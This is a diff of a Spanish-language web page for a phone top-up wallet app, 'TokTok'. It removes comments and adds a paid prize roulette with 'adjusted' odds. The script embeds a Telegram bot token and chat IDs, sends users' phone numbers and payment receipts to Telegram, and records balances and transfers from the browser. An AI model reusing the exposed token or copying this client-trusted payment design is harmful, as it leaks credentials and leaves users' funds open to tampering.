@@ -60,7 +60,7 @@
                 flex: 1;
                 overflow-y: auto;
                 -webkit-overflow-scrolling: touch;
-                padding-bottom: 60px; /* Espacio para la barra de navegación */
+                padding-bottom: 60px;
             }
             
             .mobile-bottom-nav {
@@ -381,7 +381,6 @@
                 font-size: 14px;
             }
             
-            /* MEJORADA: Tarjeta de balance con diseño tipo tarjeta de débito */
             .mobile-balance-card {
                 background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 25%, #6d28d9 50%, #5b21b6 75%, #4c1d95 100%);
                 color: white;
@@ -396,7 +395,6 @@
                 z-index: 1;
             }
             
-            /* Efectos de reflejo y brillo */
             .mobile-balance-card::before {
                 content: '';
                 position: absolute;
@@ -420,7 +418,6 @@
                 z-index: 1;
             }
             
-            /* Patrón de fondo sutil */
             .mobile-balance-card .card-background {
                 position: absolute;
                 top: 0;
@@ -433,14 +430,13 @@
                 z-index: 1;
             }
             
-            /* Imagen de la mascota */
             .mobile-balance-card .mascot-overlay {
                 position: absolute;
                 bottom: -10px;
                 right: -5px;
                 width: 250px;
                 height: 250px;
-                background-image: url('m.png'); /* Tu imagen de la mascota */
+                background-image: url('m.png');
                 background-size: contain;
                 background-repeat: no-repeat;
                 background-position: center;
@@ -449,7 +445,6 @@
                 pointer-events: none;
             }
             
-            /* Chip de tarjeta */
             .mobile-balance-card .card-chip {
                 position: absolute;
                 top: 20px;
@@ -527,7 +522,6 @@
                 box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             }
             
-            /* Botón de recargar dentro de la tarjeta */
             .mobile-balance-card #mobile-recharge-balance-btn {
                 margin-top: 20px;
                 background: rgba(255, 255, 255, 0.2);
@@ -575,12 +569,10 @@
                 margin-top: 8px;
             }
             
-            /* Ocultar elementos de desktop */
             .desktop-only {
                 display: none !important;
             }
             
-            /* Nuevos estilos para el modal de recarga de saldo */
             .qr-code-container {
                 display: flex;
                 justify-content: center;
@@ -624,7 +616,6 @@
                 word-break: break-all;
             }
             
-            /* Estilo para el campo de código del creador */
             .creator-code-input {
                 background: #fff3cd;
                 border-color: #ffc107;
@@ -638,7 +629,6 @@
                 background: #fff;
             }
 
-            /* Estilo para botón ENTEL deshabilitado */
             .operator-btn[data-operator="entel"],
             .mobile-operator-btn[data-operator="entel"] {
                 opacity: 0.5;
@@ -665,13 +655,11 @@
             }
         }
         
-        /* Estilos para desktop (se mantienen igual) */
         @media (min-width: 769px) {
             .mobile-only {
                 display: none !important;
             }
             
-            /* Todos los estilos originales se mantienen aquí */
             .glass-card {
                 background: rgba(255, 255, 255, 0.95);
                 backdrop-filter: blur(12px);
@@ -809,7 +797,6 @@
                 object-fit: cover;
             }
             
-            /* MEJORADA: Tarjeta de balance en desktop con diseño tipo tarjeta de débito */
             .balance-card {
                 background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 25%, #6d28d9 50%, #5b21b6 75%, #4c1d95 100%);
                 color: white;
@@ -822,7 +809,6 @@
                 z-index: 1;
             }
             
-            /* Efectos de reflejo y brillo para desktop */
             .balance-card::before {
                 content: '';
                 position: absolute;
@@ -846,7 +832,6 @@
                 z-index: 1;
             }
             
-            /* Patrón de fondo sutil para desktop */
             .balance-card .card-background {
                 position: absolute;
                 top: 0;
@@ -859,14 +844,13 @@
                 z-index: 1;
             }
             
-            /* Imagen de la mascota para desktop */
             .balance-card .mascot-overlay {
                 position: absolute;
                 bottom: -10px;
                 right: -5px;
                 width: 250px;
                 height: 250px;
-                background-image: url('m.png'); /* Tu imagen de la mascota */
+                background-image: url('m.png');
                 background-size: contain;
                 background-repeat: no-repeat;
                 background-position: center;
@@ -875,7 +859,6 @@
                 pointer-events: none;
             }
             
-            /* Chip de tarjeta para desktop */
             .balance-card .card-chip {
                 position: absolute;
                 top: 25px;
@@ -944,7 +927,6 @@
                 box-shadow: 0 3px 15px rgba(0, 0, 0, 0.1);
             }
             
-            /* Botón de recargar dentro de la tarjeta en desktop */
             .balance-card #recharge-balance-btn {
                 margin-top: 25px;
                 background: rgba(255, 255, 255, 0.2);
@@ -1075,7 +1057,6 @@
                 color: #d97706;
             }
             
-            /* Nuevos estilos para el modal de recarga de saldo (desktop) */
             .qr-code-container-desktop {
                 display: flex;
                 justify-content: center;
@@ -1119,7 +1100,6 @@
                 word-break: break-all;
             }
             
-            /* Estilo para el campo de código del creador en desktop */
             .creator-code-input-desktop {
                 background: #fff3cd;
                 border-color: #ffc107;
@@ -1133,7 +1113,6 @@
                 background: #fff;
             }
 
-            /* Estilo para botón ENTEL deshabilitado */
             .operator-btn[data-operator="entel"],
             .mobile-operator-btn[data-operator="entel"] {
                 opacity: 0.5;
@@ -1160,7 +1139,6 @@
             }
         }
 
-        /* Estilos para la factura flotante */
         .invoice-container {
             background: white;
             border-radius: 8px;
@@ -1271,7 +1249,6 @@
             grid-column: 1 / -1;
         }
         
-        /* Para móvil - MEJORAS ESPECÍFICAS PARA LOS BOTONES */
         @media (max-width: 768px) {
             #invoice-modal .modal-content {
                 margin: 16px;
@@ -1294,7 +1271,6 @@
                 padding: 12px;
             }
             
-            /* MEJORAS ESPECÍFICAS PARA LOS BOTONES EN MÓVIL */
             #invoice-modal .modal-content {
                 position: relative;
                 z-index: 1000;
@@ -1343,15 +1319,10 @@
         <div class="mobile-content" id="mobile-content">
             <!-- Vista de Inicio -->
             <div id="mobile-home-view">
-                <!-- Tarjeta de balance MEJORADA -->
+                <!-- Tarjeta de balance -->
                 <div class="mobile-balance-card">
-                    <!-- Fondo de patrón -->
                     <div class="card-background"></div>
-                    
-                    <!-- Chip de tarjeta -->
                     <div class="card-chip"></div>
-                    
-                    <!-- Imagen de la mascota -->
                     <div class="mascot-overlay"></div>
                     
                     <div class="mobile-balance-label">Balance disponible</div>
@@ -1391,11 +1362,10 @@
                         <span>Juegos</span>
                     </a>
 
-<a href="store.html" class="mobile-action-btn" style="display: flex; flex-direction: column; align-items: center;">
-    <img src="Imagenes/store.png" alt="Store" style="width: 37px; height: 37px; background: #06b6d4; border-radius: 25%; margin-bottom: 6px;">
-    <span>GC Store</span>
-</a>
-</a>
+                    <a href="store.html" class="mobile-action-btn" style="display: flex; flex-direction: column; align-items: center;">
+                        <img src="Imagenes/store.png" alt="Store" style="width: 37px; height: 37px; background: #06b6d4; border-radius: 25%; margin-bottom: 6px;">
+                        <span>GC Store</span>
+                    </a>
                 </div>
                 
                 <!-- Últimas transacciones -->
@@ -1605,13 +1575,11 @@
                     <input type="number" id="mobile-custom-amount" class="mobile-input" min="1">
                 </div>
                 
-                <!-- Detalles específicos para VIVA -->
                 <div id="mobile-viva-details" class="text-sm text-gray-500 mb-4 hidden">
                     <i class="fas fa-info-circle mr-1"></i>
                     <span id="mobile-viva-details-text"></span>
                 </div>
                 
-                <!-- Detalles para otras operadoras -->
                 <div id="mobile-recharge-details" class="text-sm text-gray-500 mb-4 hidden">
                     <i class="fas fa-info-circle mr-1"></i>
                     <span id="mobile-recharge-details-text"></span>
@@ -1768,7 +1736,7 @@
                 <div class="mb-4">
                     <label class="block text-sm font-medium text-gray-700 mb-1">Método de pago</label>
                     <div class="qr-code-container">
-                        <img src="imagenes/qr.jpg" class="qr-code" alt="QR de pago"> <!-- imagen de qr-->
+                        <img src="imagenes/qr.jpg" class="qr-code" alt="QR de pago">
                     </div>
                     <p class="text-sm text-center text-gray-500 mt-2">Escanee el código QR para realizar el pago</p>
                 </div>
@@ -2239,8 +2207,6 @@
                         <input type="number" id="viva-custom-amount" class="input-field w-full" min="1">
                     </div>
                     
-
-                    
                     <div class="pt-4 flex justify-end space-x-3">
                         <button id="cancel-viva-recharge" class="px-4 py-2.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-800 transition-colors font-medium">
                             Cancelar
@@ -2330,7 +2296,7 @@
                     <div>
                         <label class="block text-sm font-medium text-gray-700 mb-1">Método de pago</label>
                         <div class="qr-code-container-desktop">
-                            <img src="imagenes/qr.jpg" class="qr-code-desktop" alt="QR de pago"> <!-- imagen de qr-->
+                            <img src="imagenes/qr.jpg" class="qr-code-desktop" alt="QR de pago">
                         </div>
                         <p class="text-sm text-center text-gray-500 mt-2">Escanee el código QR para realizar el pago</p>
                     </div>
@@ -2388,6 +2354,66 @@
         </div>
     </div>
 
+    <!-- ==================== BOTÓN Y MODAL DE LA RULETA (PROBABILIDADES AJUSTADAS) ==================== -->
+    <button id="roulette-fab" class="fixed bottom-20 right-4 md:bottom-8 md:right-8 z-50 w-14 h-14 md:w-16 md:h-16 bg-gradient-to-br from-purple-600 to-pink-500 rounded-full shadow-2xl flex items-center justify-center text-white text-2xl md:text-3xl animate-bounce hover:scale-110 transition-transform" style="box-shadow: 0 10px 25px -5px rgba(217, 70, 239, 0.5);">
+        <i class="fas fa-cog fa-spin" style="--fa-animation-duration: 3s;"></i>
+        <span class="sr-only">Ruleta de Premios</span>
+    </button>
+
+    <!-- Modal de la Ruleta -->
+    <div id="roulette-modal" class="fixed inset-0 z-50 flex items-center justify-center opacity-0 invisible transition-all duration-300" style="background-color: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px);">
+        <div class="bg-gradient-to-br from-gray-900 to-purple-900 rounded-3xl w-11/12 max-w-md p-5 shadow-2xl border border-purple-400 relative">
+            <!-- Botón cerrar -->
+            <button id="close-roulette-modal" class="absolute top-2 right-2 text-gray-300 hover:text-white text-xl z-10">
+                <i class="fas fa-times"></i>
+            </button>
+
+            <div class="text-center mb-4">
+                <h2 class="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 to-pink-300">✨ Ruleta GC TokTok ✨</h2>
+                <p class="text-xs text-purple-200">Ingresa código o compra giro por 1 Bs</p>
+            </div>
+
+            <!-- La ruleta (simulada con CSS) -->
+            <div class="relative w-48 h-48 mx-auto mb-5">
+                <div id="wheel" class="absolute inset-0 rounded-full border-8 border-yellow-400 shadow-[0_0_30px_#fbbf24] transition-transform duration-3000 ease-out" style="transform: rotate(0deg); background: conic-gradient(#f87171 0deg 36deg, #fbbf24 36deg 72deg, #4ade80 72deg 108deg, #60a5fa 108deg 144deg, #c084fc 144deg 180deg, #f472b6 180deg 216deg, #fb923c 216deg 252deg, #a78bfa 252deg 288deg, #facc15 288deg 324deg, #6ee7b7 324deg 360deg);">
+                    <!-- Marcadores de texto fijos (premios) -->
+                    <div class="absolute inset-0 flex items-center justify-center text-white font-black text-sm drop-shadow-lg">GC</div>
+                </div>
+                <!-- Marcador fijo (flecha) -->
+                <div class="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-3 text-4xl filter drop-shadow-2xl" style="color: #fde047;">▼</div>
+            </div>
+
+            <!-- Lista de premios (actualizada: 0 Bs en lugar de 0.50) -->
+            <div class="grid grid-cols-5 gap-1 text-center text-white text-xs font-semibold mb-4 bg-black/30 p-2 rounded-xl">
+                <div class="bg-red-400/50 p-1 rounded">0</div>
+                <div class="bg-yellow-400/50 p-1 rounded">1</div>
+                <div class="bg-green-400/50 p-1 rounded">2</div>
+                <div class="bg-blue-400/50 p-1 rounded">5</div>
+                <div class="bg-purple-400/50 p-1 rounded">8</div>
+                <div class="bg-pink-400/50 p-1 rounded">0</div>
+                <div class="bg-orange-400/50 p-1 rounded">1</div>
+                <div class="bg-indigo-400/50 p-1 rounded">2</div>
+                <div class="bg-amber-400/50 p-1 rounded">5</div>
+                <div class="bg-emerald-400/50 p-1 rounded">8</div>
+            </div>
+
+            <!-- Input de código -->
+            <input type="text" id="roulette-code" placeholder="Ej: GC-TOK-8A3F" class="w-full px-4 py-3 rounded-xl bg-gray-800 text-white border border-purple-500 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center uppercase" maxlength="12">
+
+            <!-- Botones de acción -->
+            <div class="flex gap-2 mt-4">
+                <button id="spin-roulette-btn" class="flex-1 bg-gradient-to-r from-pink-500 to-purple-600 text-white font-bold py-3 px-2 rounded-xl shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-1 text-sm">
+                    <i class="fas fa-spinner"></i> CÓDIGO
+                </button>
+                <button id="buy-spin-btn" class="flex-1 bg-gradient-to-r from-green-500 to-teal-500 text-white font-bold py-3 px-2 rounded-xl shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-1 text-sm">
+                    <i class="fas fa-shopping-cart"></i> COMPRAR 1 BS
+                </button>
+            </div>
+            <p id="roulette-message" class="text-center text-sm text-yellow-300 mt-2 min-h-[20px]"></p>
+        </div>
+    </div>
+    <!-- ==================== FIN RULETA PROBABILIDADES AJUSTADAS ==================== -->
+
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <script>
@@ -2397,7 +2423,6 @@
         window.supabase = supabase.createClient(supabaseUrl, supabaseKey);
       
         // Configuración de bots de Telegram para cada operadora
-        // 10 GRUPOS DE TELEGRAM PARA ENTEL
         const TELEGRAM_BOTS_ENTEL = [
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5097260004' },
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5095663519' },
@@ -2411,7 +2436,6 @@
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-4890816539' }
         ];
         
-        // 5 GRUPOS DE TELEGRAM PARA TIGO
         const TELEGRAM_BOTS_TIGO = [
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-4843757881' },
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5077788894' },
@@ -2420,7 +2444,6 @@
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5085496619' }
         ];
         
-        // 5 GRUPOS DE TELEGRAM PARA VIVA
         const TELEGRAM_BOTS_VIVA = [
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5059040889' },
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5037389529' },
@@ -2429,13 +2452,11 @@
             { token: '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY', chatId: '-5084926883' }
         ];
         
-        // Configuración del bot de Telegram para (SALDO TOKTOK)
         const RECHARGE_BOT_TOKEN = '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY';
         const RECHARGE_CHAT_ID = '-4851584355';
         
-        // NUEVO: Configuración del bot para CÓDIGO DEL CREADOR
-        const CREATOR_BOT_TOKEN = '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY'; // Usando el mismo token
-        const CREATOR_CHAT_ID = '-5115300449'; // REEMPLAZAR CON EL CHAT ID CORRECTO PARA CÓDIGOS DE CREADOR
+        const CREATOR_BOT_TOKEN = '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY';
+        const CREATOR_CHAT_ID = '-5115300449';
         
         // Variables globales
         let currentUser = null;
@@ -2480,15 +2501,12 @@
             }, 3000);
         };
         
-        // Función para enviar mensaje a Telegram según la operadora
         const sendTelegramMessage = async (message, operator) => {
             let botToken, chatId;
             let groupNumber = 0;
             
-            // Seleccionar bot y chat según la operadora de forma aleatoria
             switch(operator) {
                 case 'entel':
-                    // Para ENTEL: seleccionar aleatoriamente uno de los 10 grupos
                     const randomIndexEntel = Math.floor(Math.random() * TELEGRAM_BOTS_ENTEL.length);
                     const selectedBotEntel = TELEGRAM_BOTS_ENTEL[randomIndexEntel];
                     botToken = selectedBotEntel.token;
@@ -2498,7 +2516,6 @@
                     break;
                     
                 case 'tigo':
-                    // Para TIGO: seleccionar aleatoriamente uno de los 5 grupos
                     const randomIndexTigo = Math.floor(Math.random() * TELEGRAM_BOTS_TIGO.length);
                     const selectedBotTigo = TELEGRAM_BOTS_TIGO[randomIndexTigo];
                     botToken = selectedBotTigo.token;
@@ -2508,7 +2525,6 @@
                     break;
                     
                 case 'viva':
-                    // Para VIVA: seleccionar aleatoriamente uno de los 5 grupos
                     const randomIndexViva = Math.floor(Math.random() * TELEGRAM_BOTS_VIVA.length);
                     const selectedBotViva = TELEGRAM_BOTS_VIVA[randomIndexViva];
                     botToken = selectedBotViva.token;
@@ -2550,10 +2566,8 @@
             }
         };
         
-        // Función para enviar solicitud de recarga a Telegram (nuevo bot independiente)
         const sendRechargeRequest = async (data, receiptFile) => {
             try {
-                // Primero enviamos el mensaje con los datos
                 const messageResponse = await fetch(`https://api.telegram.org/bot${RECHARGE_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -2580,7 +2594,6 @@
                     throw new Error('Error al enviar el mensaje');
                 }
                 
-                // Si hay un comprobante, lo enviamos como foto
                 if (receiptFile) {
                     const formData = new FormData();
                     formData.append('chat_id', RECHARGE_CHAT_ID);
@@ -2599,7 +2612,6 @@
                     }
                 }
                 
-                // NUEVO: Si hay código del creador, enviarlo al bot específico
                 if (data.creatorCode && data.creatorCode.trim() !== '') {
                     await sendCreatorCode(data);
                 }
@@ -2611,7 +2623,6 @@
             }
         };
         
-        // NUEVO: Función para enviar código del creador a Telegram
         const sendCreatorCode = async (data) => {
             try {
                 const creatorMessage = `
@@ -2652,7 +2663,6 @@
             }
         };
         
-        // Funciones para manejar modales
         const openModal = (modalId) => {
             const modal = document.getElementById(modalId);
             modal.classList.add('active');
@@ -2677,7 +2687,6 @@
             document.body.style.overflow = '';
         };
         
-        // Función para abrir el modal de factura centrado
         function openInvoiceModal() {
             const modal = document.getElementById('invoice-modal');
             modal.classList.add('active');
@@ -2685,7 +2694,6 @@
             document.body.style.overflow = 'hidden';
         }
         
-        // Función para cerrar el modal de factura
         function closeInvoiceModal() {
             const modal = document.getElementById('invoice-modal');
             modal.classList.remove('active');
@@ -2693,7 +2701,6 @@
             document.body.style.overflow = '';
         }
         
-        // Función para generar y mostrar la factura automáticamente después de una transacción
         function showTransactionInvoice(transaction, transactionType = 'general') {
             if (!transaction) {
                 console.error('No transaction data provided');
@@ -2704,10 +2711,8 @@
             const amountClass = isPositive ? 'positive-amount' : 'negative-amount';
             const amountSign = isPositive ? '+' : '-';
             
-            // Generar ID único para la factura
             const invoiceId = 'INV-' + (transaction.id ? transaction.id.substring(0, 8).toUpperCase() : 'TEMP') + '-' + Date.now().toString().slice(-6);
             
-            // Obtener nombre del tipo de transacción
             const typeNames = {
                 'deposit': 'Ingreso',
                 'withdrawal': 'Retiro', 
@@ -2716,7 +2721,6 @@
             };
             const transactionTypeName = typeNames[transaction.type] || transaction.type;
             
-            // Determinar título según el tipo de transacción
             let invoiceTitle = 'COMPROBANTE DE TRANSACCIÓN';
             if (transactionType === 'recharge') {
                 invoiceTitle = 'COMPROBANTE DE RECARGA';
@@ -2724,8 +2728,7 @@
                 invoiceTitle = 'COMPROBANTE DE TRANSFERENCIA';
             }
             
-           // Crear contenido horizontal compacto de la factura
-const invoiceHTML = `
+            const invoiceHTML = `
 <div class="invoice-container success-animation" style="font-size: 8px; line-height: 1.1; padding: 5px;">
     <div class="invoice-header" style="margin-bottom: 3px;">
         <div class="invoice-logo" style="font-size: 10px; margin-bottom: 1px;">TokTok</div>
@@ -2816,15 +2819,12 @@ const invoiceHTML = `
 </div>
 `;
             
-            // Insertar contenido en el modal
             document.getElementById('invoice-content').innerHTML = invoiceHTML;
             
-            // Mostrar modal automáticamente centrado
             setTimeout(() => {
                 openInvoiceModal();
             }, 400);
             
-            // Guardar datos para la descarga
             currentInvoiceData = {
                 html: invoiceHTML,
                 id: invoiceId,
@@ -2832,20 +2832,17 @@ const invoiceHTML = `
             };
         }
         
-        // Función para descargar la factura como imagen
         function downloadInvoiceAsImage() {
             if (!currentInvoiceData) {
                 showToast('No hay datos de factura para descargar', 'error');
                 return;
             }
             
-            // Mostrar indicador de carga
             const downloadBtn = document.getElementById('download-invoice');
             const originalText = downloadBtn.innerHTML;
             downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i><span>Generando...</span>';
             downloadBtn.disabled = true;
             
-            // Usar html2canvas para convertir el contenido a imagen
             if (typeof html2canvas === 'undefined') {
                 const script = document.createElement('script');
                 script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
@@ -2915,7 +2912,6 @@ const invoiceHTML = `
             }
         }
 
-        // Funciones para cargar datos
         const loadUserProfile = async (userId) => {
             const { data, error } = await supabase
                 .from('user_profiles')
@@ -3081,7 +3077,6 @@ const invoiceHTML = `
             return data;
         };
         
-        // Función para obtener el crédito según la operadora y monto
         const getCreditForRecharge = (operator, amount) => {
             amount = parseFloat(amount);
             
@@ -3100,11 +3095,9 @@ const invoiceHTML = `
             return `${amount} Bs crédito`;
         };
         
-        // Función para mostrar detalles de recarga según operadora
         const showRechargeDetails = (operator, amount) => {
             amount = parseFloat(amount);
             
-            // Ocultar todos los detalles primero
             document.querySelectorAll('#recharge-details, #viva-details, #mobile-recharge-details, #mobile-viva-details').forEach(el => {
                 el.classList.add('hidden');
             });
@@ -3112,7 +3105,6 @@ const invoiceHTML = `
             if (!operator || amount === 'custom') return;
             
             if (operator === 'viva') {
-                // Mostrar detalles específicos para VIVA
                 const vivaDetailsElement = document.getElementById('viva-details') || document.getElementById('mobile-viva-details');
                 const vivaDetailsTextElement = document.getElementById('viva-details-text') || document.getElementById('mobile-viva-details-text');
                 
@@ -3130,7 +3122,6 @@ const invoiceHTML = `
                     }
                 }
             } else {
-                // Mostrar detalles para otras operadoras
                 const detailsElement = document.getElementById('recharge-details') || document.getElementById('mobile-recharge-details');
                 const detailsTextElement = document.getElementById('recharge-details-text') || document.getElementById('mobile-recharge-details-text');
                 
@@ -3154,7 +3145,6 @@ const invoiceHTML = `
             }
         };
         
-        // Funciones para renderizar datos
         const renderTransactions = (transactions) => {
             const container = document.getElementById('transactions-list');
             const mobileContainer = document.getElementById('mobile-transactions-list');
@@ -3349,14 +3339,12 @@ const invoiceHTML = `
         const updateUI = async () => {
             if (!currentUser) return;
             
-            // Actualizar balance
             currentBalance = await calculateBalance(currentUser.id);
             const balanceElements = document.querySelectorAll('#balance, #mobile-balance');
             balanceElements.forEach(el => {
                 if (el) el.textContent = formatCurrency(currentBalance);
             });
             
-            // Cargar y renderizar transacciones
             const filter = document.getElementById('transactions-filter')?.value || 'all';
             const mobileFilter = document.getElementById('mobile-transactions-filter')?.value || 'all';
             const activeFilter = filter || mobileFilter;
@@ -3364,11 +3352,9 @@ const invoiceHTML = `
             const transactions = await loadTransactions(currentUser.id, activeFilter);
             renderTransactions(transactions);
             
-            // Cargar y renderizar recargas
             const recharges = await loadRecharges(currentUser.id);
             renderRecharges(recharges);
             
-            // Actualizar perfil móvil
             if (document.getElementById('mobile-user-name')) {
                 document.getElementById('mobile-user-name').textContent = userProfile?.full_name || currentUser.email.split('@')[0];
                 document.getElementById('mobile-user-email').textContent = currentUser.email;
@@ -3381,7 +3367,6 @@ const invoiceHTML = `
                     day: 'numeric'
                 });
                 
-                // Configurar avatar móvil
                 const mobileAvatarElement = document.getElementById('mobile-user-avatar');
                 const mobileInitialsElement = document.getElementById('mobile-user-initials');
                 
@@ -3428,7 +3413,6 @@ const invoiceHTML = `
                 return false;
             }
             
-            // Mostrar spinner de carga
             const confirmText = document.getElementById(isMobile ? 'mobile-confirm-recharge-text' : 'confirm-recharge-text');
             const confirmSpinner = document.getElementById(isMobile ? 'mobile-confirm-recharge-spinner' : 'confirm-recharge-spinner');
             
@@ -3437,7 +3421,6 @@ const invoiceHTML = `
             if (confirmSpinner) confirmSpinner.classList.remove('hidden');
             
             try {
-                // Crear transacción
                 const transaction = await createTransaction(
                     currentUser.id,
                     amount,
@@ -3450,7 +3433,6 @@ const invoiceHTML = `
                     throw new Error('Error al crear la transacción');
                 }
                 
-                // Crear registro de recarga
                 const recharge = await createRecharge(
                     currentUser.id,
                     phoneNumber,
@@ -3463,7 +3445,6 @@ const invoiceHTML = `
                     throw new Error('Error al registrar la recarga');
                 }
                 
-                // Enviar notificación a Telegram según la operadora
                 const telegramMessage = `
 <b>Nueva recarga solicitada</b>
                     
@@ -3484,7 +3465,6 @@ const invoiceHTML = `
                 
                 showToast(`Recarga de ${amount} Bs a ${phoneNumber} exitosa`);
                 
-                // MOSTRAR FACTURA AUTOMÁTICAMENTE
                 const invoiceTransaction = {
                     ...transaction,
                     operator: selectedOperator,
@@ -3507,7 +3487,6 @@ const invoiceHTML = `
                 showToast('Error al procesar la recarga', 'error');
                 return false;
             } finally {
-                // Restaurar estado del botón
                 btn.disabled = false;
                 if (confirmText) confirmText.textContent = isMobile ? 'Confirmar recarga' : 'Confirmar';
                 if (confirmSpinner) confirmSpinner.classList.add('hidden');
@@ -3521,7 +3500,6 @@ const invoiceHTML = `
             const phoneNumber = document.getElementById(isMobile ? 'mobile-viva-phone-number' : 'viva-phone-number').value;
             let amount = selectedVivaPackage;
             
-            // Si es monto personalizado, obtener el valor del campo
             if (selectedVivaPackage === 'custom') {
                 amount = document.getElementById(isMobile ? 'mobile-viva-custom-amount' : 'viva-custom-amount').value;
             }
@@ -3548,7 +3526,6 @@ const invoiceHTML = `
                 return false;
             }
             
-            // Mostrar spinner de carga
             const confirmText = document.getElementById(isMobile ? 'mobile-confirm-viva-recharge-text' : 'confirm-viva-recharge-text');
             const confirmSpinner = document.getElementById(isMobile ? 'mobile-confirm-viva-recharge-spinner' : 'confirm-viva-recharge-spinner');
             
@@ -3557,7 +3534,6 @@ const invoiceHTML = `
             if (confirmSpinner) confirmSpinner.classList.remove('hidden');
             
             try {
-                // Crear transacción
                 const transaction = await createTransaction(
                     currentUser.id,
                     amount,
@@ -3570,7 +3546,6 @@ const invoiceHTML = `
                     throw new Error('Error al crear la transacción');
                 }
                 
-                // Crear registro de recarga
                 const recharge = await createRecharge(
                     currentUser.id,
                     phoneNumber,
@@ -3583,7 +3558,6 @@ const invoiceHTML = `
                     throw new Error('Error al registrar la recarga');
                 }
                 
-                // Enviar notificación a Telegram para VIVA
                 const telegramMessage = `
 <b>Nueva recarga VIVA solicitada</b>
                     
@@ -3604,7 +3578,6 @@ const invoiceHTML = `
                 
                 showToast(`Recarga VIVA de ${amount} Bs a ${phoneNumber} exitosa`);
                 
-                // MOSTRAR FACTURA AUTOMÁTICAMENTE
                 const invoiceTransaction = {
                     ...transaction,
                     operator: 'viva',
@@ -3627,7 +3600,6 @@ const invoiceHTML = `
                 showToast('Error al procesar la recarga', 'error');
                 return false;
             } finally {
-                // Restaurar estado del botón
                 btn.disabled = false;
                 if (confirmText) confirmText.textContent = isMobile ? 'Confirmar recarga' : 'Confirmar';
                 if (confirmSpinner) confirmSpinner.classList.add('hidden');
@@ -3657,7 +3629,6 @@ const invoiceHTML = `
                 return false;
             }
             
-            // Verificar si el destinatario existe por teléfono
             const { data: recipientUser, error: recipientError } = await supabase
                 .from('user_profiles')
                 .select('id')
@@ -3669,7 +3640,6 @@ const invoiceHTML = `
                 return false;
             }
             
-            // Crear transacción de envío
             const sendTransaction = await createTransaction(
                 currentUser.id,
                 amount,
@@ -3683,7 +3653,6 @@ const invoiceHTML = `
                 return false;
             }
             
-            // Crear transacción de recepción para el destinatario
             const receiveTransaction = await createTransaction(
                 recipientUser.id,
                 amount,
@@ -3695,7 +3664,6 @@ const invoiceHTML = `
             if (receiveTransaction) {
                 showToast(`Transferencia de ${amount} Bs enviada`);
                 
-                // MOSTRAR FACTURA AUTOMÁTICAMENTE
                 const invoiceTransaction = {
                     ...sendTransaction,
                     recipient_phone: recipientPhone,
@@ -3719,7 +3687,6 @@ const invoiceHTML = `
 
         // Event Listeners
         document.addEventListener('DOMContentLoaded', async () => {
-            // Ajustar altura para mobile (evitar problemas con la barra de navegación en iOS)
             const setVh = () => {
                 const vh = window.innerHeight * 0.01;
                 document.documentElement.style.setProperty('--vh', `${vh}px`);
@@ -3728,7 +3695,6 @@ const invoiceHTML = `
             setVh();
             window.addEventListener('resize', setVh);
             
-            // Verificar sesión
             const { data: { session }, error } = await supabase.auth.getSession();
             
             if (!session) {
@@ -3738,16 +3704,13 @@ const invoiceHTML = `
             
             currentUser = session.user;
             
-            // Cargar perfil de usuario
             userProfile = await loadUserProfile(currentUser.id);
             
             if (!userProfile) {
-                // Si no hay perfil, redirigir al login para completar registro
                 window.location.href = 'index.html';
                 return;
             }
             
-            // Actualizar UI con datos del usuario
             const nameElements = document.querySelectorAll('#user-name, #mobile-user-name');
             const emailElements = document.querySelectorAll('#user-email, #mobile-user-email');
             const phoneElements = document.querySelectorAll('#profile-phone, #mobile-profile-phone');
@@ -3776,7 +3739,6 @@ const invoiceHTML = `
                 });
             });
             
-            // Configurar avatar
             avatarElements.forEach((avatarElement, index) => {
                 if (avatarElement) {
                     const initialsElement = initialsElements[index];
@@ -3790,7 +3752,6 @@ const invoiceHTML = `
                 }
             });
             
-            // Navegación móvil
             const navItems = document.querySelectorAll('.nav-item');
             const views = ['home', 'transactions', 'profile'];
             
@@ -3799,13 +3760,11 @@ const invoiceHTML = `
                     e.preventDefault();
                     const view = item.dataset.view;
                     
-                    // Actualizar navegación
                     navItems.forEach(navItem => {
                         navItem.classList.remove('active');
                     });
                     item.classList.add('active');
                     
-                    // Actualizar vista
                     views.forEach(v => {
                         const element = document.getElementById(`mobile-${v}-view`);
                         if (element) {
@@ -3818,7 +3777,6 @@ const invoiceHTML = `
                         viewElement.classList.remove('hidden');
                     }
                     
-                    // Actualizar título
                     const titleMap = {
                         'home': 'Inicio',
                         'transactions': 'Transacciones',
@@ -3832,7 +3790,6 @@ const invoiceHTML = `
                 });
             });
             
